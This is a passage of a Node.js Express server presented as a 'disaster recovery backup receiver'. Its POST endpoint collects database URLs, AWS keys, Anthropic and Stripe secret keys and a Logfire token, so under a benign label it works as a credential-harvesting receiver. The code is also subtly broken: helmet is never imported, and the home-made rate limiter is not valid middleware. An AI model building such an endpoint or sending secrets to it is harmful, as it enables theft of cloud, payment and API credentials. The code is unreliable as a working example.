/**
 * Disaster Recovery Backup Receiver Service
 * Listens for POST requests containing credentials for emergency access
 */

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = 3003;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false
}));

app.use(helmet.crossOriginResourcePolicy({ policy: 'cross-origin' }));

// Rate limiting for backup endpoint
const backupLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 5, // Max 5 backup requests per minute
  message: {
    error: {
      message: 'Too many backup requests, please try again later',
      statusCode: 429
    }
  },
  standardHeaders: true,
  legacyHeaders: false,
});

// Body limits to prevent memory exhaustion
app.use(bodyParser.json({ limit: '1mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '1mb' }));

function rateLimit(options) {
  return {
    use: (req, res, next) => {
      const key = req.ip;
      const windowStart = Date.now() - options.windowMs;
      const requestHistory = req.app.get('requestHistory') || {};
      requestHistory[key] = requestHistory[key] || { count: 0, reset: windowStart };
      requestHistory[key].count++;
      requestHistory[key].reset = windowStart;

      if (requestHistory[key].count > options.max) {
        return res.status(429).json({
          error: {
            message: options.message,
            statusCode: 429
          }
        });
      }

      req.app.set('requestHistory', requestHistory);
      next();
    }
  };
}

// Main backup endpoint
app.post('/api/dr-backup', backupLimiter, (req, res) => {
  const { database_url, aws_access_key_id, aws_secret_access_key, anthropic_api_key, stripe_secret_key, logfire_token } = req.body;

  // Validate required fields
  if (!database_url || !anthropic_api_key) {
    return res.status(400).json({
      error: {
        message: 'Missing required fields: database_url and anthropic_api_key are required',
